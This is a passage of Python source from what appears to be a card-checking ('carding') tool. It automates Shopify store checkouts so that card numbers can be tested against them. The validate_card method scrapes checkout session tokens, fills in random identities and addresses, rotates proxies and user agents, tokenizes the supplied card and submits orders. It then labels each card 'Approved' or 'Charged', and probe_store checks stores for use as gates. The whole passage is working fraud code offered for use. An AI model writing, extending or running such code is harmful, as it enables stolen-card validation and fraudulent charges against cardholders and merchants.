                                            }
                                            candidates.append(entry)
                                            if price < best_price:
                                                best_price = price
                                                best = entry
                                except Exception:
                                    pass
                except Exception:
                    pass

                if not candidates:
                    err = "No products found"
                    self._product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now}
                    return None, [], err
            else:
                for product in all_variants:
                    for variant in product.get("variants", []):
                        try:
                            avail = variant.get("available", True)
                            if avail is False:
                                continue
                            price = float(variant.get("price") or "0")
                        except (ValueError, TypeError):
                            continue
                        if price <= 0 or price > limit:
                            continue
                        entry = {
                            "site": base_url,
                            "price": f"{price:.2f}",
                            "price_f": price,
                            "variant_id": str(variant["id"]),
                            "title": product.get("title", "Product"),
                            "handle": product.get("handle", ""),
                        }
                        candidates.append(entry)
                        if price < best_price:
                            best_price = price
                            best = entry

            if not best:
                err = f"No products under ${limit:.2f}"
                self._product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now}
                return None, [], err

            candidates.sort(key=lambda c: c["price_f"])
            self._product_cache[cache_key] = {"product": best, "candidates": candidates, "err": None, "ts": now}
            await self._step(on_step, f"found {len(candidates)} variant(s), cheapest ${best['price']}")
            return best, candidates, None

        except (asyncio.TimeoutError, RequestsError):
            err = "Timeout"
            return None, [], err
        except Exception as ex:
            return None, [], str(ex)
        finally:
            await session.aclose()

    # ------------------------------------------------------------------
    # Full checkout validation (verbatim port of validate_card)
    # ------------------------------------------------------------------
    async def validate_card(
        self,
        cc: str,
        month: str,
        year: str,
        cvv: str,
        site_url: str,
        variant_id: Optional[str] = None,
        proxy_str: Optional[str] = None,
        max_price: Optional[float] = None,
        on_step: StepCallback | None = None,
    ) -> dict:
        t0 = time.time()
        gateway = "UNKNOWN"
        price = "0.00"
        currency = "USD"
        product_title = ""
        effective_max_price = self.runtime.max_price if max_price is None else max_price

        site_url = site_url.strip()
        ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
        hostname = urlparse(ourl).netloc
        ua = random.choice(USER_AGENTS)

        def _r(response: str, charged: str = "False", approved: str = "False") -> dict:
            info = classify(response, approved)
            return {
                "Response": response,
                "CC": f"{cc}|{month}|{year}|{cvv}",
                "CCMasked": mask_card(f"{cc}|{month}|{year}|{cvv}"),
                "Product": product_title,
                "Price": price,
                "Gate": gateway,
                "Site": ourl,
                "Charged": charged,
                "Approved": approved,
                "Time": f"{round(time.time() - t0, 2)}s",
                "ElapsedMs": round((time.time() - t0) * 1000),
                **info,
            }

        sem = self._sem(hostname)
        session = self.make_session(proxy_str)

        async with sem:
            try:
                addr = pick_address(ourl)
                country_code = addr["countryCode"]
                first, last, email = random_identity()
                phone = addr["phone"]
                street = addr["address1"]
                city = addr["city"]
                state = addr["zoneCode"]
                s_zip = addr["postalCode"]

                # ── 0. Fetch product if no variant supplied ──────────────
                await self._step(on_step, "resolving product")
                best, all_candidates, err = await self.fetch_products(
                    ourl, proxy_str, effective_max_price, on_step=on_step
                )

                if all_candidates:
                    candidates_under_max = [
                        c for c in all_candidates
                        if float(c.get("price", 999999)) <= effective_max_price
                    ]
                else:
                    candidates_under_max = (
                        [best] if (best and float(best.get("price", 999999)) <= effective_max_price) else []
                    )

                if not variant_id:
                    if not candidates_under_max:
                        return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}")
                    chosen_prod = random.choice(candidates_under_max)
                    variant_id = chosen_prod["variant_id"]
                    price = chosen_prod["price"]
                    product_title = chosen_prod.get("title", "")
                else:
                    matched = next(
                        (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                        None,
                    )
                    if not matched:
                        return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available")
                    price = matched["price"]
                    product_title = matched.get("title", "")

                try:
                    if float(price) > effective_max_price:
                        return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}")
                except (ValueError, TypeError):
                    pass

                base_headers = {
                    "User-Agent": ua,
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json",
                    "Origin": ourl,
                    "Referer": f"{ourl}/",
                    "sec-ch-ua": '"Chromium";v="136", "Not.A.Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }

                # ── 1. Add to cart ───────────────────────────────────────
                await self._step(on_step, f"adding variant {variant_id} to cart")
                cart_added = False
                for payload, ct in [
                    (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                    (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
                ]:
                    try:
                        r = await session.post(
                            f"{ourl}/cart/add.js",
                            label="cart/add",
                            data=payload,
                            headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                        )
                        if r.status_code == 200:
                            cart_added = True
                            break
                    except Exception:
                        continue

                if not cart_added:
                    return _r("CART_FAILED")

                # ── 2. Get checkout page ─────────────────────────────────
                await self._step(on_step, "opening checkout session")
                try:
                    cr = await session.post(
                        f"{ourl}/checkout/",
                        label="checkout",
                        allow_redirects=True,
                        headers={**base_headers,
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    )
                    checkout_url = str(cr.url)
                    page_text = cr.text
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT")
                except Exception as ex:
                    return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")

                lower_url = checkout_url.lower()
                if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                    return _r("SITE_REQUIRES_LOGIN")

                m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
                if m:
                    attempt_token = m.group(1)
                else:
                    attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

                if not attempt_token or len(attempt_token) < 4:
                    return _r("NO_ATTEMPT_TOKEN")

                sst = extract_sst(page_text, dict(cr.headers))
                if not sst:
                    return _r("NO_SESSION_TOKEN")
                await self._step(on_step, "checkout session established")

                queue_token = (
                    extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                    extract(page_text, '"queueToken":"', '"')
                )
                stable_id = (
                    extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                    extract(page_text, '"stableId":"', '"') or
                    "1"
                )

                merch_gid = (
                    extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                    extract(page_text, "ProductVariantMerchandise/", '&q') or
                    extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                    str(variant_id)
                )

                for s, e in [
                    ('currencyCode&quot;:&quot;', "&quot;"),
                    ('"currencyCode":"', '"'),
                ]:
                    val = extract(page_text, s, e)
                    if val and len(val) == 3 and val.isalpha():
                        currency = val.upper()
                        break

                addr = pick_address(ourl, currency)
                country_code = addr["countryCode"]
                phone = addr["phone"]
                street = addr["address1"]
                city = addr["city"]
                state = addr["zoneCode"]
                s_zip = addr["postalCode"]

                subtotal = (
                    extract(page_text,
                            'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                            "&quot;") or
                    extract(page_text,
                            '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
                )
                if not subtotal:
                    m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                    subtotal = m2.group(1) if m2 else "0.01"

                unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
                build_id = None
                m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
                if m3:
                    build_id = m3.group(1)

                source_token = extract(page_text, 'name="serialized-sourceToken" content="', '"')
                if source_token:
                    source_token = source_token.replace("&quot;", "").strip('"')

                ident_sig = None
                m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
                if m4:
                    ident_sig = m4.group(1)

                graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

                gql_headers = {
                    **base_headers,
                    "shopify-checkout-client": "checkout-web/1.0",
                    "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                    "x-checkout-one-session-token": sst,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                }
                if build_id:
                    gql_headers["x-checkout-web-build-id"] = build_id
                    gql_headers["x-checkout-web-deploy-stage"] = "production"
                if source_token:
                    gql_headers["x-checkout-web-source-id"] = source_token

                merch_id_full = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
                variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

                def _base_vars() -> dict:
                    return {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queue_token or "",
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {
                                    "partialStreetAddress": {
                                        "address1": street, "address2": "", "city": city,
                                        "countryCode": country_code, "postalCode": s_zip,
                                        "firstName": first, "lastName": last,
                                        "zoneCode": state, "phone": phone,
                                    }
                                },
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyMatchingConditions": {
                                        "estimatedTimeInTransit": {"any": True},
                                        "shipments": {"any": True},
                                    },
                                    "options": {},
                                },
                                "targetMerchandiseLines": {"any": True},
                                "deliveryMethodTypes": ["SHIPPING"],
                                "expectedTotalPrice": {"any": True},
                                "destinationChanged": True,
                            }],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": False,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping": True,
                        },
                        "merchandise": {
                            "merchandiseLines": [{
                                "stableId": stable_id,
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": merch_id_full,
                                        "variantId": variant_id_full,
                                        "properties": [],
                                        "sellingPlanId": None,
                                        "sellingPlanDigest": None,
                                    }
                                },
                                "quantity": {"items": {"value": 1}},
                                "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                                "lineComponentsSource": None,
                                "lineComponents": [],
                            }]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": "", "city": "", "countryCode": country_code,
                                    "lastName": "", "zoneCode": state, "phone": "",
                                }
                            },
                        },
                        "buyerIdentity": {
                            "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                            "email": email,
                            "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"countryCode": country_code},
                            "rememberMe": False,
                        },
                        "tip": {"tipLines": []},
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": [],
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None, "signatureUuid": None,
                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "memberships": {"memberships": []},
                        "cartMetafields": [],
                    }

                # ── 3. Shipping proposal ─────────────────────────────────
                await self._step(on_step, "negotiating shipping proposal")
                ship_vars = _base_vars()
                resp_json: Any = None
                r = None

                for attempt in range(3):
                    try:
                        r = await session.post(
                            graphql_url,
                            label="shipping-proposal",
                            params={"operationName": "Proposal"},
                            headers=gql_headers,
                            json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                                  "operationName": "Proposal"},
                        )
                        resp_json = orjson.loads(r.content)
                    except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                        if attempt < 2:
                            await asyncio.sleep(1)
                        continue

                    data = resp_json.get("data", {}) or {}
                    if data.get("session"):
                        break

                    gql_errs = resp_json.get("errors", []) or []
                    if gql_errs:
                        log.debug("shipping proposal GQL errors: %s", gql_errs)
                        interpreted = parse_gql_errors(gql_errs)
                        if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                           "THROTTLED", "NO_PRODUCT"):
                            return _r(interpreted)
                        if attempt < 2:
                            await asyncio.sleep(1.5)
                            continue
                        return _r(interpreted if interpreted != "GRAPHQL_ERROR" else "GRAPHQL_ERROR")

                if not resp_json or not (resp_json.get("data") or {}).get("session"):
                    return _r("GRAPHQL_ERROR")

                try:
                    if r is not None:
                        _ship_sst = r.headers.get("x-checkout-one-session-token")
                        if _ship_sst:
                            sst = _ship_sst
                            gql_headers["x-checkout-one-session-token"] = sst
                except Exception:
                    pass

                session_data = resp_json["data"]["session"]
                negotiate = session_data.get("negotiate") or {}

                neg_errors = negotiate.get("errors") or []
                if neg_errors:
                    code = parse_gql_errors(neg_errors)
                    if code != "GRAPHQL_ERROR":
                        return _r(code)

                result_obj = negotiate.get("result") or {}
                result_type = result_obj.get("__typename", "")

                if result_type == "CheckpointDenied":
                    return _r("CHECKPOINTDENIED")
                if result_type in ("Throttled", "TooManyRequests"):
                    return _r("THROTTLED")
                if result_type == "NegotiationResultFailed":
                    return _r("NEGOTIATE_FAILED")

                checkpoint_data = result_obj.get("checkpointData")
                seller = result_obj.get("sellerProposal") or {}

                if not seller:
                    return _r("NO_SELLER_PROPOSAL")

                running_total_data = seller.get("runningTotal") or {}
                running_total = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

                delivery_data = seller.get("delivery") or {}
                delivery_strategy = ""
                shipping_amount = 0.0
                if delivery_data.get("__typename") == "FilledDeliveryTerms":
                    d_lines = delivery_data.get("deliveryLines") or []
                    if d_lines:
                        strategies = d_lines[0].get("availableDeliveryStrategies") or []
                        if strategies:
                            delivery_strategy = strategies[0].get("handle", "")
                            try:
                                amt_data = strategies[0].get("amount") or {}
                                shipping_amount = float(
                                    amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                                )
                            except (ValueError, TypeError):
                                shipping_amount = 0.0

                tax_data = seller.get("tax") or {}
                tax_amount = 0.0
                if tax_data.get("__typename") == "FilledTaxTerms":
                    try:
                        tax_amt_data = tax_data.get("totalTaxAmount") or {}
                        tax_amount = float(
                            tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                        )
                    except (ValueError, TypeError):
                        pass

                payment_data = seller.get("payment") or {}
                payment_identifier = None
                if payment_data.get("__typename") == "FilledPaymentTerms":
                    avail_lines = payment_data.get("availablePaymentLines") or []
                    for line in avail_lines:
                        pm = line.get("paymentMethod") or {}
                        pid = pm.get("paymentMethodIdentifier")
                        if pid:
                            detected_gateway = (pm.get("extensibilityDisplayName") or
                                                pm.get("name") or pm.get("brand") or
                                                pm.get("displayName") or "Shopify Payments")
                            if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                                payment_identifier = pid
                                gateway = detected_gateway
                                price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                                try:
                                    if float(price) > effective_max_price:
                                        return _r(f"PRICE_OVER_MAX: total ${price} > ${effective_max_price:.2f}")
                                except (ValueError, TypeError):
                                    pass
                                break

                if not payment_identifier:
                    return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

                # ── 4. Delivery proposal ─────────────────────────────────
                await self._step(on_step, "negotiating delivery proposal")
                deliv_vars = copy.deepcopy(ship_vars)
                deliv_vars["sessionInput"]["sessionToken"] = sst

                deliv_vars["delivery"]["deliveryLines"][0].update({
                    "destination": {
                        "streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": first, "lastName": last,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "expectedTotalPrice": {
                        "value": {"amount": str(shipping_amount), "currencyCode": currency}
                    },
                    "destinationChanged": False,
                })
                deliv_vars["payment"]["billingAddress"] = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                }
                deliv_vars["taxes"]["proposedTotalAmount"] = {
                    "value": {"amount": str(tax_amount), "currencyCode": currency}
                }
                deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                    "number": phone, "countryCode": country_code
                }
                if checkpoint_data:
                    deliv_vars["checkpointData"] = checkpoint_data

                try:
                    dr = await session.post(
                        graphql_url,
                        label="delivery-proposal",
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                              "operationName": "Proposal"},
                    )
                    d_resp = orjson.loads(dr.content)
                    log.debug("delivery proposal response keys: %s",
                              list(d_resp.keys()) if isinstance(d_resp, dict) else type(d_resp))
                    if "errors" in d_resp and "data" not in d_resp:
                        log.debug("delivery proposal schema errors: %s",
                                  [e.get("message") for e in d_resp.get("errors", [])][:3])
                    _del_sst = dr.headers.get("x-checkout-one-session-token")
                    if _del_sst:
                        sst = _del_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                    d_result = (
                        d_resp.get("data", {}).get("session", {})
                        .get("negotiate", {}).get("result", {})
                    )
                    if d_result:
                        d_typename = d_result.get("__typename", "")
                        if d_typename == "SubmittedForCompletion":
                            return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
                        d_seller = d_result.get("sellerProposal") or {}
                        d_total = d_seller.get("total") or d_seller.get("runningTotal") or {}
                        d_amt = d_total.get("value", {}).get("amount") or d_total.get("amount")
                        if d_amt:
                            running_total = d_amt
                            try:
                                price = f"{float(running_total):.2f}"
                            except (ValueError, TypeError):
                                pass
                            try:
                                if float(price) > effective_max_price:
                                    return _r(f"PRICE_OVER_MAX: total ${price} > ${effective_max_price:.2f}")
                            except (ValueError, TypeError):
                                pass
                        d_delivery = d_seller.get("delivery") or {}
                        if d_delivery.get("__typename") == "FilledDeliveryTerms":
                            d_d_lines = d_delivery.get("deliveryLines") or []
                            if d_d_lines:
                                d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                                d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                                if d_selected.get("handle"):
                                    delivery_strategy = d_selected["handle"]
                                elif d_strategies:
                                    delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                                if d_strategies:
                                    d_ship_amt = d_strategies[0].get("amount") or {}
                                    try:
                                        shipping_amount = float(
                                            d_ship_amt.get("value", {}).get("amount") or
                                            d_ship_amt.get("amount") or "0"
                                        )
                                    except (ValueError, TypeError):
                                        pass
                        d_tax = d_seller.get("tax") or {}
                        if d_tax.get("__typename") == "FilledTaxTerms":
                            d_tax_amt = d_tax.get("totalTaxAmount") or {}
                            try:
                                tax_amount = float(
                                    d_tax_amt.get("value", {}).get("amount") or
                                    d_tax_amt.get("amount") or "0"
                                )
                            except (ValueError, TypeError):
                                pass
                except Exception as ex:
                    log.debug("delivery proposal error: %s", ex)

                # ── 5. Tokenize card ─────────────────────────────────────
                await self._step(on_step, "tokenizing card (PCI vault)")
                vault_payload = {
                    "credit_card": {
                        "number": cc,
                        "month": int(month),
                        "year": int(f"20{year}"),
                        "verification_value": cvv,
                        "name": f"{first} {last}",
                        "start_month": None,
                        "start_year": None,
                        "issue_number": "",
                    },
                    "payment_session_scope": hostname,
                }
                vault_headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://checkout.pci.shopifyinc.com",
                    "User-Agent": ua,
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }
                if ident_sig:
                    vault_headers["shopify-identification-signature"] = ident_sig

                vault_endpoints = [
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://deposit.shopifyinc.com/sessions",
                ]
                token = None
                for vault_url in vault_endpoints:
                    try:
                        vr = await session.post(vault_url, label="vault", json=vault_payload, headers=vault_headers)
                        vd = orjson.loads(vr.content)
                        token = vd.get("id")
                        if token:
                            break
                    except Exception:
                        continue

                if not token:
                    return _r("TOKENIZATION_FAILED")

                # ── 6. Submit for completion ─────────────────────────────
                await self._step(on_step, "submitting for completion")
                billing_addr = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                }

                def _build_submit_body() -> dict:
                    submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                    submit_deliv_line["selectedDeliveryStrategy"] = {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {"phone": phone},
                    }
                    submit_deliv_line["expectedTotalPrice"] = {"any": True}

                    submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                    for ml in submit_merch.get("merchandiseLines", []):
                        ml["expectedTotalPrice"] = {"any": True}

                    return {
                        "query": MUTATION_SUBMIT,
                        "variables": {
                            "input": {
                                "sessionInput": {"sessionToken": sst},
                                "queueToken": queue_token or "",
                                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                                "delivery": {
                                    "deliveryLines": [submit_deliv_line],
                                    "noDeliveryRequired": [],
                                    "useProgressiveRates": True,
                                    "prefetchShippingRatesStrategy": None,
                                    "supportsSplitShipping": True,
                                },
                                "merchandise": submit_merch,
                                "payment": {
                                    "totalAmount": {"any": True},
                                    "paymentLines": [{
                                        "paymentMethod": {
                                            "directPaymentMethod": {
                                                "paymentMethodIdentifier": payment_identifier,
                                                "sessionId": token,
                                                "billingAddress": billing_addr,
                                                "cardSource": None,
                                            }
                                        },
                                        "amount": {"any": True},
                                        "dueAt": None,
                                    }],
                                    "billingAddress": billing_addr,
                                },
                                "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
                                "taxes": {
                                    "proposedAllocations": None,
                                    "proposedTotalAmount": {"any": True},
                                    "proposedTotalIncludedAmount": None,
                                    "proposedMixedStateTotalAmount": None,
                                    "proposedExemptions": [],
                                },
                                "tip": {"tipLines": []},
                                "note": {"message": None, "customAttributes": []},
                                "localizationExtension": {"fields": []},
                                "nonNegotiableTerms": None,
                                "optionalDuties": {"buyerRefusesDuties": False},
                                **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                            },
                            "attemptToken": attempt_token,
                            "metafields": [],
                            "analytics": {"requestUrl": checkout_url},
                        },
                        "operationName": "SubmitForCompletion",
                    }

                s_resp: dict = {}
                s_data: dict = {}
                for submit_attempt in range(3):
                    try:
                        sr = await session.post(
                            graphql_url,
                            label="submit",
                            params={"operationName": "SubmitForCompletion"},
                            headers=gql_headers,
                            json=_build_submit_body(),
                        )
                        s_resp = orjson.loads(sr.content)
                        _sub_sst = sr.headers.get("x-checkout-one-session-token")
                        if _sub_sst:
                            sst = _sub_sst
                            gql_headers["x-checkout-one-session-token"] = sst
                    except (asyncio.TimeoutError, RequestsError):
                        return _r("TIMEOUT")
                    except Exception as ex:
                        log.debug("submit exception: %s", ex)
                        return _r("SUBMIT_FAILED")

                    log.debug("submit[%d] response typename: %s", submit_attempt,
                              (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))

                    s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                    if not s_data:
                        errs = s_resp.get("errors") or []
                        log.debug("submit no data, top-level errors: %s", errs)
                        if errs:
                            for err_item in errs:
                                for fld in ("code", "message"):
                                    val = str(err_item.get(fld) or "").upper()
                                    if val:
                                        norm = normalize_response(val)
                                        if norm != "CARD_DECLINED":
                                            approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                            return _r(norm, approved=approved)
                        return _r("GRAPHQL_ERROR")

                    stype = s_data.get("__typename", "")

                    if stype == "SubmitRejected":
                        sub_errs = s_data.get("errors") or []
                        all_confirmable = all(
                            e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                        ) if sub_errs else False
                        if all_confirmable and submit_attempt < 2:
                            log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                            await asyncio.sleep(0.5)
                            continue
                    break

                stype = s_data.get("__typename", "")

                # ── Handle submit result types ───────────────────────────
                if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = s_data.get("receipt") or {}
                    rtype = receipt.get("__typename", "")

                    if rtype == "ProcessedReceipt":
                        return _r("ORDER_PLACED", charged="True", approved="True")
                    if rtype == "ActionRequiredReceipt":
                        return _r("3DS_REQUIRED", approved="True")
                    if rtype == "FailedReceipt":
                        pe = receipt.get("processingError") or {}
                        pe_type = pe.get("__typename", "")
                        log.debug("FailedReceipt processingError: %s", pe)
                        if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                            return _r("NO_PRODUCT")
                        if pe_type == "OrderCreationFailure":
                            return _r("ORDER_CREATION_FAILED")
                        code = str(pe.get("code") or "").upper()
                        msg = str(pe.get("messageUntranslated") or "").upper()
                        raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                        norm = normalize_response(raw) if raw else "CARD_DECLINED"
                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                        return _r(norm, approved=approved)

                    rid = receipt.get("id")
                    if rid:
                        await self._step(on_step, "polling receipt")
                        poll_body = {
                            "query": QUERY_POLL,
                            "variables": {"receiptId": rid, "sessionToken": sst},
                            "operationName": "PollForReceipt",
                        }
                        await asyncio.sleep(2)
                        for _ in range(6):
                            try:
                                pr = await session.post(
                                    graphql_url,
                                    label="poll-receipt",
                                    params={"operationName": "PollForReceipt"},
                                    headers=gql_headers,
                                    json=poll_body,
                                )
                                pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                                pt = pd.get("__typename", "")
                                if pt == "ProcessedReceipt":
                                    return _r("ORDER_PLACED", charged="True", approved="True")
                                if pt == "ActionRequiredReceipt":
                                    return _r("3DS_REQUIRED", approved="True")
                                if pt == "FailedReceipt":
                                    pe = pd.get("processingError") or {}
                                    pe_type = pe.get("__typename", "")
                                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                        return _r("NO_PRODUCT")
                                    code = str(pe.get("code") or "").upper()
                                    msg = str(pe.get("messageUntranslated") or "").upper()
                                    if code == "CAPTCHA_REQUIRED":
                                        return _r("CAPTCHA_REQUIRED", approved="False")
                                    raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                                    norm = normalize_response(raw) if raw else "CARD_DECLINED"
                                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                                    return _r(norm, approved=approved)
                                if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                    delay = pd.get("pollDelay", 3000) / 1000
                                    await asyncio.sleep(min(delay, 4))
                                    continue
                            except Exception:
                                pass
                            break

                    return _r("CARD_DECLINED")

                if stype == "SubmitFailed":
                    return _r(normalize_response(str(s_data.get("reason") or "")))

                if stype == "SubmitRejected":
                    errs = s_data.get("errors") or []
                    log.debug("SubmitRejected errors: %s", errs)
                    if errs:
                        best_code = "CARD_DECLINED"
                        for err_item in errs:
                            for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                        "localizedMessageHtml"):
                                val = str(err_item.get(fld) or "").upper()
                                if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                      "PAYMENT ERROR"):
                                    continue
                                norm = normalize_response(val)
                                if norm != "CARD_DECLINED":
                                    best_code = norm
                                    break
                            if best_code != "CARD_DECLINED":
                                break
                        approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                           "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                        return _r(best_code, approved=approved)
                    return _r("CARD_DECLINED")

                if stype == "Throttled":
                    return _r("THROTTLED")
                if stype == "CheckpointDenied":
                    return _r("CHECKPOINTDENIED")

                return _r("CARD_DECLINED")

            except JobCancelled:
                return _r("CANCELLED")
            except (asyncio.TimeoutError, RequestsError):
                return _r("TIMEOUT")
            except Exception as ex:
                log.debug("validate_card exception: %s", ex, exc_info=True)
                return {
                    "Response": "ERROR",
                    "CC": f"{cc}|{month}|{year}|{cvv}",
                    "CCMasked": mask_card(f"{cc}|{month}|{year}|{cvv}"),
                    "Product": product_title,
                    "Price": price,
                    "Gate": gateway,
                    "Site": ourl,
                    "Charged": "False",
                    "Approved": "False",
                    "Time": f"{round(time.time() - t0, 2)}s",
                    "ElapsedMs": round((time.time() - t0) * 1000),
                    "Detail": f"{type(ex).__name__}: {str(ex)[:200]}",
                    "bucket": "error",
                    "gateway_live": False,
                    "approved": False,
                    "charged": False,
                }
            finally:
                await session.aclose()

    # ------------------------------------------------------------------
    # /check semantics: is the store live + does it carry cheap products
    # ------------------------------------------------------------------
    async def probe_store(
        self,
        site: str,
        card: dict,
        proxy_str: Optional[str] = None,
        max_price: Optional[float] = None,
        variant_id: Optional[str] = None,
        on_step: StepCallback | None = None,
    ) -> dict:
        site = site.strip()
        ourl = site if site.startswith("http") else f"https://{site}"

        result = await self.validate_card(
            card["cc"], card["month"], card["year"], card["cvv"],
            ourl, variant_id=variant_id, proxy_str=proxy_str,
            max_price=max_price, on_step=on_step,
        )
        response_code = result.get("Response", "")
        return {
            "valid": response_code in LIVE_RESPONSES,
            "site": site,
            "url": result.get("Site", ourl),
            "product": result.get("Product", ""),
            "price": result.get("Price", "0.00"),
            "card_response": response_code,
            "gate": result.get("Gate", "UNKNOWN"),
            "approved": result.get("Approved", "False"),
            "charged": result.get("Charged", "False"),
            "time": result.get("Time", ""),
